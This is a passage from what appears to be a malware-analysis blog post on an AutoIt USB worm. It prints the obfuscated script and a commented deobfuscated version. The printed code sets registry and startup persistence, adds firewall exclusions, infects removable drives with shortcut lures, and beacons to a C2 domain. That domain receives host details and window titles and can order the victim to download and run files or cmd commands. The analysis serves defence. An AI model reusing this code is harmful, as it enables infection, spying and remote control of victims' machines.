&amp; \"o\", \"R\" &amp; ChrW(104 - 35) &amp; ChrW(71) &amp; String(\"_\") &amp; ChrW(92 - 9) &amp; String(\"Z\"), $zmfxwlaehjlydtzjijusglanfhotalcrwcugcrydkpdvjacxzayc)\n    EndIf\n    If RegRead(String(\"H\") &amp; ChrW(75) &amp; ChrW(13 + 56) &amp; String(\"Y\") &amp; String(\"_\") &amp; \"C\" &amp; ChrW(85) &amp; ChrW(35 + 47) &amp; String(\"R\") &amp; String(\"E\") &amp; String(\"N\") &amp; ChrW(16 + 68) &amp; ChrW(95) &amp; \"U\" &amp; ChrW(83) &amp; ChrW(69) &amp; ChrW(95 - 13) &amp; ChrW(14 + 78) &amp; \"S\" &amp; ChrW(22 + 89) &amp; ChrW(11 + 91) &amp; ChrW(116) &amp; \"w\" &amp; ChrW(34 + 63) &amp; ChrW(114) &amp; ChrW(102 - 1) &amp; \"\\\" &amp; \"M\" &amp; String(\"i\") &amp; \"c\" &amp; \"r\" &amp; \"o\" &amp; ChrW(115) &amp; ChrW(111) &amp; String(\"f\") &amp; ChrW(15 + 101) &amp; \"\\\" &amp; String(\"W\") &amp; ChrW(105) &amp; \"n\" &amp; ChrW(22 + 78) &amp; \"o\" &amp; String(\"w\") &amp; \"s\" &amp; \"\\\" &amp; ChrW(67) &amp; ChrW(117) &amp; String(\"r\") &amp; \"r\" &amp; \"e\" &amp; \"n\" &amp; String(\"t\") &amp; \"V\" &amp; ChrW(101) &amp; ChrW(119 - 5) &amp; ChrW(157 - 42) &amp; ChrW(17 + 88) &amp; \"o\" &amp; String(\"n\") &amp; ChrW(92) &amp; ChrW(82) &amp; ChrW(24 + 93) &amp; String(\"n\"), ChrW(10 + 70) &amp; ChrW(8 + 106) &amp; ChrW(105) &amp; String(\"n\") &amp; ChrW(135 - 19) &amp; \"D\" &amp; ChrW(114) &amp; \"i\" &amp; ChrW(118) &amp; String(\"e\") &amp; ChrW(114)) &lt;&gt; $hhncrpbgveqwgfldaczzfnpgudbgpycjggulwbosdkhwycgupkgv Then\n        RegWrite(String(\"H\") &amp; ChrW(75) &amp; ChrW(13 + 56) &amp; String(\"Y\") &amp; String(\"_\") &amp; \"C\" &amp; ChrW(85) &amp; ChrW(35 + 47) &amp; String(\"R\") &amp; String(\"E\") &amp; String(\"N\") &amp; ChrW(16 + 68) &amp; ChrW(95) &amp; \"U\" &amp; ChrW(83) &amp; ChrW(69) &amp; ChrW(95 - 13) &amp; ChrW(14 + 78) &amp; \"S\" &amp; ChrW(22 + 89) &amp; ChrW(11 + 91) &amp; ChrW(116) &amp; \"w\" &amp; ChrW(34 + 63) &amp; ChrW(114) &amp; ChrW(102 - 1) &amp; \"\\\" &amp; \"M\" &amp; String(\"i\") &amp; \"c\" &amp; \"r\" &amp; \"o\" &amp; ChrW(115) &amp; ChrW(111) &amp; String(\"f\") &amp; ChrW(15 + 101) &amp; \"\\\" &amp; String(\"W\") &amp; ChrW(105) &amp; \"n\" &amp; ChrW(22 + 78) &amp; \"o\" &amp; String(\"w\") &amp; \"s\" &amp; \"\\\" &amp; ChrW(67) &amp; ChrW(117) &amp; String(\"r\") &amp; \"r\" &amp; \"e\" &amp; \"n\" &amp; String(\"t\") &amp; \"V\" &amp; ChrW(101) &amp; ChrW(119 - 5) &amp; ChrW(157 - 42) &amp; ChrW(17 + 88) &amp; \"o\" &amp; String(\"n\") &amp; ChrW(92) &amp; ChrW(82) &amp; ChrW(24 + 93) &amp; String(\"n\"), ChrW(10 + 70) &amp; ChrW(8 + 106) &amp; ChrW(105) &amp; String(\"n\") &amp; ChrW(135 - 19) &amp; \"D\" &amp; ChrW(114) &amp; \"i\" &amp; ChrW(118) &amp; String(\"e\") &amp; ChrW(114), \"R\" &amp; ChrW(104 - 35) &amp; ChrW(71) &amp; String(\"_\") &amp; ChrW(92 - 9) &amp; String(\"Z\"), $zmfxwlaehjlydtzjijusglanfhotalcrwcugcrydkpdvjacxzayc)\n    EndIf\n    If FileExists(@StartupCommonDir &amp; String(\"\\\") &amp; $brunmrrowhdwhubbyrfplqhrieeeertznzpdigvlzkhdlhooxbyi &amp; ChrW(50 - 4) &amp; ChrW(139 - 31) &amp; ChrW(110) &amp; ChrW(107)) = False Then\n        FileCreateShortcut(ChrW(99) &amp; ChrW(109) &amp; ChrW(100) &amp; ChrW(47 + -1) &amp; ChrW(1 + 100) &amp; ChrW(148 - 28) &amp; \"e\", @StartupCommonDir &amp; String(\"\\\") &amp; $vcjuqioffbuxjhmrijmlbucfcfhjjcrkovnvyluomdhvzuybwwat &amp; ChrW(50 - 4) &amp; ChrW(139 - 31) &amp; ChrW(110) &amp; ChrW(107), \"\", String(\"/\") &amp; ChrW(147 - 48) &amp; ChrW(74 - 42) &amp; ChrW(19 + 96) &amp; ChrW(12 + 104) &amp; ChrW(19 + 78) &amp; String(\"r\") &amp; String(\"t\") &amp; ChrW(21 + 11) &amp; $vhqjlcehmlieoehhextrvtpajefzqqgcskdeifsfboynacphygja &amp; ChrW(44 + -12) &amp; ChrW(38) &amp; \" \" &amp; \"e\" &amp; ChrW(15 + 105) &amp; ChrW(105) &amp; ChrW(28 + 88))\n    EndIf\n    If FileExists(@StartupCommonDir &amp; String(\"\\\") &amp; String(\"M\") &amp; ChrW(145 - 40) &amp; \"c\" &amp; \"r\" &amp; ChrW(114 - 3) &amp; \"s\" &amp; ChrW(135 - 24) &amp; String(\"f\") &amp; ChrW(166 - 50) &amp; ChrW(85) &amp; String(\"p\") &amp; String(\"d\") &amp; ChrW(41 + 56) &amp; ChrW(30 + 86) &amp; ChrW(112 - 11) &amp; \".\" &amp; ChrW(154 - 46) &amp; ChrW(110) &amp; ChrW(156 - 49)) = False Then\n        FileCreateShortcut(@ScriptDir &amp; String(String(\"\\\")) &amp; ChrW(28 + 49) &amp; String(\"i\") &amp; ChrW(20 + 79) &amp; String(\"r\") &amp; ChrW(41 + 70) &amp; String(\"s\") &amp; ChrW(111) &amp; ChrW(140 - 38) &amp; ChrW(117 - 1) &amp; ChrW(83) &amp; \"e\" &amp; String(\"c\") &amp; \"u\" &amp; String(\"r\") &amp; ChrW(105) &amp; String(\"t\") &amp; ChrW(30 + 91) &amp; ChrW(47 + -1) &amp; ChrW(104 - 3) &amp; String(\"x\") &amp; ChrW(138 - 37), @StartupCommonDir &amp; String(\"\\\") &amp; String(\"M\") &amp; ChrW(145 - 40) &amp; \"c\" &amp; \"r\" &amp; ChrW(114 - 3) &amp; \"s\" &amp; ChrW(135 - 24) &amp; String(\"f\") &amp; ChrW(166 - 50) &amp; ChrW(85) &amp; String(\"p\") &amp; String(\"d\") &amp; ChrW(41 + 56) &amp; ChrW(30 + 86) &amp; ChrW(112 - 11) &amp; \".\" &amp; ChrW(154 - 46) &amp; ChrW(110) &amp; ChrW(156 - 49), \"\", ChrW(57 - 10) &amp; String(\"A\") &amp; ChrW(167 - 50) &amp; ChrW(152 - 36) &amp; ChrW(16 + 95) &amp; ChrW(3 + 70) &amp; ChrW(124 - 8) &amp; String(\"3\") &amp; \"E\" &amp; \"x\" &amp; String(\"e\") &amp; ChrW(35 + 64) &amp; String(\"u\") &amp; ChrW(142 - 26) &amp; \"e\" &amp; ChrW(113 - 30) &amp; ChrW(17 + 82) &amp; ChrW(118 - 4) &amp; ChrW(142 - 37) &amp; \"p\" &amp; \"t\" &amp; String(ChrW(48 - 16)) &amp; @ScriptDir &amp; String(\"\\\") &amp; $ivfnryrxlmwhjvjiruxaaxafykecdkqygsyawqyvstbsozrqazjk)\n    EndIf\n    If @error Then\n    EndIf\nEndFunc\n\nFunc vgmovrvjjuidbgwhmbqjnpauyhhmjxquqasvirrwuqfxizyilzss()\n    If $rbypnqzvtwjxyxdxymfhjxzhgvdecqndtvznepbrfunuhstsqsyq &lt; 1 Then\n        $ejeluzphspscvwarxilawchgwhrytnceafuxnnfxaqbeazwqzatr = 1\n        Return -1\n    EndIf\n    If @error Then\n    EndIf\n    $hkutrhhnotrycgqzkagzofwuethswgperhdwmctptafiujtsmhkp = TCPRecv($rbypnqzvtwjxyxdxymfhjxzhgvdecqndtvznepbrfunuhstsqsyq, 1024, 0)\n    If @error Then\n        $ejeluzphspscvwarxilawchgwhrytnceafuxnnfxaqbeazwqzatr = 1\n        Return -1\n    EndIf\n    $mdkyphoybroscebnlbesywpuytnrnesroeepieqgsrqsptqxdkkw &amp;= $hkutrhhnotrycgqzkagzofwuethswgperhdwmctptafiujtsmhkp\n    If StringInStr($mdkyphoybroscebnlbesywpuytnrnesroeepieqgsrqsptqxdkkw, $nipcbxpmhqnfnobrddekcozeadfwlaztuiqspsvpwsoldvrkyemu) Then\n        $eggbnanyzoqhdmhvctmhgqgoanywzpgowazkbahmpvodjxdhcyps = StringSplit($mdkyphoybroscebnlbesywpuytnrnesroeepieqgsrqsptqxdkkw, $nipcbxpmhqnfnobrddekcozeadfwlaztuiqspsvpwsoldvrkyemu)\n        $hkutrhhnotrycgqzkagzofwuethswgperhdwmctptafiujtsmhkp = $eggbnanyzoqhdmhvctmhgqgoanywzpgowazkbahmpvodjxdhcyps[1]\n        $vcinaraaaqyjhcldnwualarkabfdirubamtsrmjjbhlyxgvgmaue = StringInStr($mdkyphoybroscebnlbesywpuytnrnesroeepieqgsrqsptqxdkkw, $nipcbxpmhqnfnobrddekcozeadfwlaztuiqspsvpwsoldvrkyemu)\n        $vcinaraaaqyjhcldnwualarkabfdirubamtsrmjjbhlyxgvgmaue += StringLen(String($nipcbxpmhqnfnobrddekcozeadfwlaztuiqspsvpwsoldvrkyemu))\n        $dogukylzmxqjwwjvirmankyeotnvfyqiwpxlhyiszkxerbcawaxv = StringLen($mdkyphoybroscebnlbesywpuytnrnesroeepieqgsrqsptqxdkkw)\n        $mdkyphoybroscebnlbesywpuytnrnesroeepieqgsrqsptqxdkkw = StringMid($mdkyphoybroscebnlbesywpuytnrnesroeepieqgsrqsptqxdkkw, $vcinaraaaqyjhcldnwualarkabfdirubamtsrmjjbhlyxgvgmaue, $dogukylzmxqjwwjvirmankyeotnvfyqiwpxlhyiszkxerbcawaxv - $vcinaraaaqyjhcldnwualarkabfdirubamtsrmjjbhlyxgvgmaue)\n        Return $hkutrhhnotrycgqzkagzofwuethswgperhdwmctptafiujtsmhkp\n    EndIf\n    Return \"\"\nEndFunc\n\nFunc yutherqpkizldomanazujuowkemziyaieyvuglsqadmmqsuumyvk($eggbnanyzoqhdmhvctmhgqgoanywzpgowazkbahmpvodjxdhcyps)\n    If @error Then\n    EndIf\n    $eggbnanyzoqhdmhvctmhgqgoanywzpgowazkbahmpvodjxdhcyps = StringReplace($eggbnanyzoqhdmhvctmhgqgoanywzpgowazkbahmpvodjxdhcyps, $nipcbxpmhqnfnobrddekcozeadfwlaztuiqspsvpwsoldvrkyemu, \"|\")\n    TCPSend($rbypnqzvtwjxyxdxymfhjxzhgvdecqndtvznepbrfunuhstsqsyq, $eggbnanyzoqhdmhvctmhgqgoanywzpgowazkbahmpvodjxdhcyps &amp; $nipcbxpmhqnfnobrddekcozeadfwlaztuiqspsvpwsoldvrkyemu)\n    If @error Then\n        $ejeluzphspscvwarxilawchgwhrytnceafuxnnfxaqbeazwqzatr = 1\n        Return 0\n    Else\n        Return 1\n    EndIf\nEndFunc\n\nFunc axhehxxafrgmhqherstchiuehcfrjrmjdqigprnjmsljwafbkpcu()\n    $ejeluzphspscvwarxilawchgwhrytnceafuxnnfxaqbeazwqzatr = 0\n    TCPCloseSocket($rbypnqzvtwjxyxdxymfhjxzhgvdecqndtvznepbrfunuhstsqsyq)\n    If @error Then\n    EndIf\n    TCPShutdown()\n    If @error Then\n    EndIf\n    TCPStartup()\n    If @error Then\n    EndIf\n    $rbypnqzvtwjxyxdxymfhjxzhgvdecqndtvznepbrfunuhstsqsyq = -1\n    $rbypnqzvtwjxyxdxymfhjxzhgvdecqndtvznepbrfunuhstsqsyq = TCPConnect(TCPNameToIP($dcznysrlakdhbtfenvsppoltilqrjiifqrjqpmwwwxpoovwmcgzf), $arapqeencactbyqjiooaywsrywfooepbidezquajhjtwvwmqemdn)\n    If @error Then\n    EndIf\n    $ejeluzphspscvwarxilawchgwhrytnceafuxnnfxaqbeazwqzatr = 0\nEndFunc\n</code></pre>","tags":["AutoIt","USB Malware","Worming"]},{"location":"blogs/202306-USBMalware/#deobfuscated-script","title":"Deobfuscated script","text":"<pre><code>Global $susp_domain_1 = \"googleads.publicvm.com\"\nGlobal $int_223 = 223\nGlobal $string_C:\\MicrosoftSecurity = \"C:\\MicrosoftSecurity\"\nGlobal $susp_file_lnk_1 = \"MicrosoftCMD.lnk\"\nGlobal $string_microsoft = \"Microsoft\"\nGlobal $string_microsoftsecurity = \"Microsoft Security\"\nGlobal $string_microsoftsecurity_exe = \"MicrosoftSecurity.exe\"\nGlobal $int_4 = 4\nGlobal $string_vbs = \"vbs\"\nLocal $string_zeus = \"Zeus\"\n$string_zeus &amp;= \"_\" &amp; Hex(DriveGetSerial(@HomeDrive))\nGlobal $string_0.4x = \"0.4x\"\nIf FileExists(\"C:\\MicrosoftSecurity/Microsoft.lnk\") Then\n    $string_0.4x = \"0.4x Usb\"\nEndIf\n$string_Microsoft.a3x = \"Microsoft.a3x\"\n$int_0 = 0\n$string_\\r\\n = \"\\r\\n\"\n$string_0LIONW0 = \"0LIONW0\"\n$int_0 = 0\n$int_-1 = -1\nIf @ScriptDir &lt;&gt; $string_C:\\MicrosoftSecurity AND $int_4 = 4 Then\n    If $string_vbs = \"exe\" Then\n        FileCopy(@AutoItExe, $jbwklcjcaewtgpgszopzykmpwnarnhcrstdgofpsjelsafyvywtx, 9)\n        Run($jbwklcjcaewtgpgszopzykmpwnarnhcrstdgofpsjelsafyvywtx)\n    Else\n        DirCopy(@ScriptDir, \"C:\\Microsoft\", 1)\n        ShellExecute(\"C:\\MicrosoftSecurity\\MicrosoftSecurity.exe C:\\MicrosoftSecurity\\Microsoft.a3x\" , @SW_HIDE)\n        ShellExecute(\"cmd.exe /c start C:\\MicrosoftSecurity/MicrosoftSecurity.exe C:\\MicrosoftSecurity\\Microsoft.a3x\", \"\", \"\", @SW_HIDE)\n    EndIf\n    FileSetAttrib(\"C:\\MicrosoftSecurity\", \"+RSH\") // Read, System file, Hidden\n    Exit\nEndIf\n$string_\"\" = \"\"\n$int_-1 = -1\nsetFirewallExclusion_DeleteLNK_RemovePersistenceRegKey()\nRunAutoItScript_SetPersistenceKeys_CreateStartupCommonLNK()\nCreateScriptDirLNKFiles()\nUnsetShowhiddenInfectAllUSBwithLNKFiles(\"ALL\")\nCreateDocuments_Downloads_LNK_CreateDir_Reports|Statements|My Pictures|My Videos|My Pictures|My Videos()\n$int_4 = 4\n$string_\"\" = \"\"\n$string_\"\"2 = \"\"\n$string_GoogleChrome.exe = \"GoogleChrome.exe\"\nSleep(@AutoItPID / 10)\nIf _singleton($string_GoogleChrome.exe, 1) = 0 Then\n    Exit\nEndIf\n\n\nWhile 1\n    $int_4 += 1\n    If $int_4 = 5 Then\n        $int_4 = 0\n        RunAutoItScript_SetPersistenceKeys_CreateStartupCommonLNK()\n        CreateDocuments_Downloads_LNK_CreateDir_Reports|Statements|My Pictures|My Videos|My Pictures|My Videos()\n    EndIf\n    If @error Then\n    EndIf\n    $messageReceivedFromTCPRecv = TCPRecv()\n    If @error Then\n    EndIf\n    Select \n        Case $messageReceivedFromTCPRecv = -1 OR $int_0 = 1\n            Sleep(3000)\n            C2CommandDef()\n            // C2 callback with \"lv|zeus|ComputerName|UserName||OSVersion OSArch|0.4x usb|AV_NAME|\"\n            C2Exfiltrate(\"lv0LIONW0zeus0LIONW0@ComputerName0LIONW0@UserName0LIONW0\"\"$string_0LIONW0@OSVersion @OSArch0LIONW00.4x0LIONW0 &amp; getAVNameFromWMI() &amp; $string_0LIONW0 &amp; \"\")\n\n        Case $messageReceivedFromTCPRecv = \"\"\n            $int_0 += 1\n            Sleep(1000)\n            If $int_0 = 8 Then\n                $int_0 = 0\n                // Get the full title of the current active window\n                $string_\"\"2 = WinGetTitle(\"\")\n                If $string_\"\"2 &lt;&gt; $string_\"\" Then\n                    // Exfiltrate the current Window name \"ac|ActiveWindowName\"\n                    C2Exfiltrate(\"ac0LIONW0 &amp; $string_\"\"2)\n                EndIf\n                $string_\"\" = $string_\"\"2\n                $string_\"\"2 = \"\"\n            EndIf\n\n        Case $messageReceivedFromTCPRecv &lt;&gt; \"\"\n            $splitted_MsgTCPRecv_by_0LIONW0 = StringSplit($messageReceivedFromTCPRecv, \"0LIONW0\", 1)\n            If $splitted_MsgTCPRecv_by_0LIONW0[0] &gt; 0 Then\n                Select \n                    // [0: Action_Number - do something if &gt;0] 0LIONW0 [1: Action - DL] 0LIONW0 [2] 0LIONW0 [3]\n                    //  DL mode:   \" 1 | DL | Download_Source | Dest_FileName\"  --&gt; Download this file to %TEMP%\\FILENAME --&gt; Then use cmd.exe to execute\n                    Case $splitted_MsgTCPRecv_by_0LIONW0[1] = \"DL\"\n                        InetGet($splitted_MsgTCPRecv_by_0LIONW0[2], @TempDir &amp; aString(\"\\\") &amp; $splitted_MsgTCPRecv_by_0LIONW0[3], 1)\n                        If FileExists(@TempDir &amp; aString(\"\\\") &amp; $splitted_MsgTCPRecv_by_0LIONW0[3]) Then\n                            ShellExecute(\"cmd.exe | /c start %temp%\\\" &amp; $splitted_MsgTCPRecv_by_0LIONW0[3], \"\", \"\", @SW_HIDE)\n                            C2Exfiltrate(\"MSG0LIONW0Executed As\" &amp; $splitted_MsgTCPRecv_by_0LIONW0[3])\n                        Else\n                            C2Exfiltrate(\"MSG0LIONW0Download ERR\")\n                        EndIf\n\n                    //  un mode: Uninstall the C2 and persistence components\n                    Case $splitted_MsgTCPRecv_by_0LIONW0[1] = \"un\"\n                        Uninstall_undoPersistence_UnsetFirewall()\n\n                    // cmd mode: \" 1 | cmd | CMD_ARGUMENTS\"\n                    Case $splitted_MsgTCPRecv_by_0LIONW0[1] = \"cmd\"\n                        If ShellExecute(\"cmd.exe\", $splitted_MsgTCPRecv_by_0LIONW0[2], \"\", \"\", @SW_HIDE) = 1 Then\n                            C2Exfiltrate(\"MSG0LIONW0\" &amp; \"Executed cmd.exe\" &amp; $splitted_MsgTCPRecv_by_0LIONW0[2])\n                        Else\n                            C2Exfiltrate(\"MSG0LIONW0Execute ERR cmd.exe\" &amp; $splitted_MsgTCPRecv_by_0LIONW0[2])\n                        EndIf\n                EndSelect\n            EndIf\n    EndSelect\nWEnd\n\nFunc Uninstall_undoPersistence_UnsetFirewall()\n    RegDelete(\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"microsoftsecurity)\n    RegDelete(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Microsoft Security\")\n    RegDelete(\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"PrintDriver\")\n    RegDelete(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"PrintDriver\")\n    RegDelete(\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Cortana\")\n    RegDelete(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Cortana\")\n    RegDelete(\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"MicrosoftOffice\")\n    RegDelete(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"MicrosoftOffice\")\n    RegDelete(\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"MicrosoftCMD.lnk\")\n    RegDelete(\"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"MicrosoftCMD.lnk\")\n    RegDelete(\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"MicrosoftSecurity.exe\")\n    RegDelete(\"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"MicrosoftSecurity.exe\")\n    ShellExecute(\"netsh\", \"firewall delete allowedprogram \"@AutoItExe\", \"\", \"\", @SW_HIDE)\n    ShellExecute(@ComSpec, \"/k ping 0 &amp; del \"@AutoItExe\" &amp; exit\", \"\", \"\", @SW_HIDE)\n    C2Exfiltrate(\"MSG0LIONW0 Uninstall !!\")\n    Exit\nEndFunc\n\nFunc getAVNameFromWMI()\n    Local $avname\n    If @OSVersion = \"WIN_XP\" Then\n        $owmi = ObjGet(\"winmgmts:\\\\localhost\\root\\SecurityCenter\")\n    Else\n        $owmi = ObjGet(\"winmgmts:\\\\localhost\\root\\SecurityCenter2\")\n    EndIf\n    $colitems = $owmi.execquery(\"Select * from AntiVirusProduct\")\n    For $objantivirusproduct In $colitems\n        $avname = $objantivirusproduct.displayname\n    Next\n    If $avname = False Then\n        Return \"No-AntiVirus\"\n    Else\n        Return $avname\n    EndIf\nEndFunc\n\nFunc setFirewallExclusion_DeleteLNK_RemovePersistenceRegKey()\n    EnvSet(\"SEE_MASK_NOZONECHECKS\")\n    ShellExecute(\"netsh \" &amp; @AutoItExe &amp; \" \" &amp; \"MicrosoftSecurity.exe\" &amp; \"\" ENABLE\"\", \"\", \"\", @SW_HIDE)\n    If @error Then\n    EndIf\n    $string_C:\\GoogleChrome = \"C:\\GoogleChrome\"\n    $string_C:\\MozillaFirefox = \"C:\\MozillaFirefox\"\n    ProcessClose(\"GoogleChrome.exe\")\n    ProcessClose(\"Mozilla.exe\")\n    Sleep(999)\n    FileDelete(\"C:\\GoogleChrome\\GoogleChrome.a3x\")\n    FileDelete(\"C:\\GoogleChrome\\GoogleChrome.exe\")\n    FileDelete(\"C:\\GoogleChrome\\GoogleChrome.lnk\")\n    FileDelete(\"C:\\GoogleChrome\\My Pictures.lnk\")\n    FileDelete(\"C:\\GoogleChrome\\GoogleUpdate.lnk\")\n    FileDelete(\"C:\\GoogleChrome\\My Music.lnk\")\n    FileDelete(\"C:\\GoogleChrome\\WindowsUpdate.lnk\")\n    If ProcessExists(\"Mozilla.exe\") Then\n        ProcessClose(\"Mozilla.exe\")\n    EndIf\n    FileDelete(\"C:\\GoogleChrome\\Mozilla.exe\")\n    FileDelete(\"C:\\GoogleChrome\\Mozilla.vbs\")\n    FileDelete(\"C:\\GoogleChrome\\Mozilla.vb\")\n    FileDelete(\"C:\\MozillaFirefox\\GoogleChrome.a3x\")\n    FileDelete(\"C:\\MozillaFirefox\\GoogleChrome.exe\")\n    FileDelete(\"C:\\MozillaFirefox\\GoogleChrome.lnk\")\n    FileDelete(\"C:\\MozillaFirefox\\My Pictures.lnk\")\n    FileDelete(\"C:\\MozillaFirefox\\GoogleUpdate.lnk\")\n    FileDelete(\"C:\\MozillaFirefox\\My Music.lnk\")\n    FileDelete(\"C:\\MozillaFirefox\\WindowsUpdate.lnk\")\n    If ProcessExists(\"Mozilla.exe\") Then\n        ProcessClose(\"Mozilla.exe\")\n    EndIf\n    FileDelete(\"C:\\MozillaFirefox\\Mozilla.exe\")\n    FileDelete(\"C:\\MozillaFirefox\\Mozilla.vbs\")\n    FileDelete(\"C:\\MozillaFirefox\\Mozilla.vb\")\n    RegDelete(\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"JavaUpdate\")\n    RegDelete(\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"AdopeUpdate\")\n    RegDelete(\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"NewJavaInstall\")\n    RegDelete(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"AdopeFlash\")\n    RegDelete(\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"WindowsUpdate.lnk\")\n    RegDelete(\"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"WindowsUpdate.lnk\")\n    RegDelete(\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"GoogleChrome.exe\")\n    RegDelete(\"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"GoogleChrome.exe\")\n    RegDelete(\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Google Chrome\")\n    RegDelete(\"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Google Chrome\")\nEndFunc\n\nFunc CreateDocuments_Downloads_LNK_CreateDir_Reports|Statements|My Pictures|My Videos|My Pictures|My Videos()\n    $string_AutoIt_Script_Run_a3x = \"Microsoft\\MicrosoftSecurity.exe  /AutoIt3ExecuteScript  ..\\Microsoft\\Microsoft.a3x\"\n    $array_RemovableDrives = DriveGetDrive(\"REMOVABLE\")\n    For $i = 1 To UBound($array_RemovableDrives) - 1\n        If DriveStatus($array_RemovableDrives[$i]) = \"READY\" Then\n            If DriveSpaceFree($array_RemovableDrives[$i]) &gt; 1024 Then\n                DirCopy(@ScriptDir, $array_RemovableDrives[$i] &amp; aString(\"\\\") &amp; \"Microsoft\", 1)\n                FileSetAttrib(\"$array_RemovableDrives[$i]\\Microsoft\", \"+RSH\")\n\n                // Create malicious shortcuts as \"x:\\Documents\" and \"x:\\Downloads\"\n                FileCreateShortcut(\"cmd.exe\", \"$array_RemovableDrives[$i]\\Documents\", \"\", \"/c start Microsoft\\MicrosoftSecurity.exe  /AutoIt3ExecuteScript  ..\\Microsoft\\Microsoft.a3x &amp; explorer  %CD% &amp; exit\", \"\", \"%windir%\\system32\\SHELL32.dll\", \"\", 3, @SW_SHOWMINNOACTIVE)\n                FileCreateShortcut(\"cmd.exe\", \"$array_RemovableDrives[$i]\\Downloads\", \"\", \"/c start Microsoft\\MicrosoftSecurity.exe  /AutoIt3ExecuteScript  ..\\Microsoft\\Microsoft.a3x &amp; explorer  %CD% &amp; exit\", \"\", \"%windir%\\system32\\SHELL32.dll\", \"\", 3, @SW_SHOWMINNOACTIVE)\n\n                // Create x:\\Reports, x:\\Statements, x:\\My Pictures, x:\\My Videos if not exist\n                If FileExists(\"$array_RemovableDrives[$i]\\Reports) = False Then\n                    DirCreate(\"$array_RemovableDrives[$i]\\Reports\")\n                EndIf\n                If FileExists(\"$array_RemovableDrives[$i]\\Statements\") = False Then\n                    DirCreate(\"$array_RemovableDrives[$i]\\Statements\")\n                EndIf\n                If @error Then\n                EndIf\n                If FileExists(\"$array_RemovableDrives[$i]\\My Pictures\") = False Then\n                    DirCreate(\"$array_RemovableDrives[$i]\\My Pictures\")\n                EndIf\n                If @error Then\n                EndIf\n                If FileExists(\"$array_RemovableDrives[$i]\\My Videos\") = False Then\n                    DirCreate(\"$array_RemovableDrives[$i]\\My Videos\")\n                    C2Exfiltrate(\"MSG0LIONW0 Spreading !!\")\n                EndIf\n                If @error Then\n                EndIf\n                If @error Then\n                EndIf\n                UnsetShowhiddenInfectAllUSBwithLNKFiles()\n            EndIf\n        EndIf\n    Next\n    If @error Then\n    EndIf\nEndFunc\n\nFunc UnsetShowhiddenInfectAllUSBwithLNKFiles($string_REMOVEABLE = \"REMOVABLE\")\n    $string_Microsoft\\MicrosoftSecurity.exe  /AutoIt3ExecuteScript  ..\\Microsoft\\Microsoft.a3x = \"Microsoft\\MicrosoftSecurity.exe  /AutoIt3ExecuteScript  ..\\Microsoft\\Microsoft.a3x\"\n    RegWrite(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\", \"ShowSuperHidden\", 0)\n    $array_removable_drives = DriveGetDrive(\"REMOVABLE\")\n\n    // Loop through all active REMOVABLE Drives, check if \"x:\\Microsoft\" exists, if not make it\n    If IsArray($array_removable_drives) Then\n        For $i = 1 To $array_removable_drives[0]\n            If DriveStatus($array_removable_drives[$i]) = \"READY\" Then\n                If DriveSpaceFree($array_removable_drives[$i]) &gt; 10 Then\n                    If FileExists($array_removable_drives[$i] &amp; \"\\Microsoft\") = 0 Then FileDelete($array_removable_drives[$i] &amp; \"\\Microsoft\")\n                    DirCopy(@ScriptDir, $array_removable_drives[$i] &amp; aString(\"\\\") &amp; \"Microsoft\", 1)\n                    FileSetAttrib($array_removable_drives[$i] &amp; \"\\Microsoft\", \"+RSH\")\n                    Local $varFirstFile = FileFindFirstFile($array_removable_drives[$i] &amp; \"\\*.*\")\n                    While 1\n                        Dim $varNextFile = FileFindNextFile($varFirstFile)\n                        If $varNextFile = \"\" Then ExitLoop\n                        If StringInStr(FileGetAttrib($array_removable_drives[$i] &amp; aString(\"\\\") &amp; $varNextFile), \"D\") AND ($varNextFile &lt;&gt; \".\" OR $varNextFile &lt;&gt; \"..\") Then\n                            FileCreateShortcut(\"cmd.exe\", \"$array_removable_drives[$i]\\$varNextFile\\$varNextFile\", \"\", \"/c start ..\\Microsoft\\MicrosoftSecurity.exe\"  /AutoIt3ExecuteScript  ..\\Microsoft\\Microsoft.a3x &amp; explorer  %CD% exit\", \"\", \"%windir%\\system32\\SHELL32.dll\", \"\", 3, @SW_SHOWMINNOACTIVE)\n                            FileCreateShortcut(\"cmd.exe\", \"$array_removable_drives[$i]\\$varNextFile\\Music\", \"\", \"/c start ..\\Microsoft\\MicrosoftSecurity.exe  /AutoIt3ExecuteScript  ..\\Microsoft\\Microsoft.a3x &amp; explorer  %CD%  &amp; exit\", \"\",  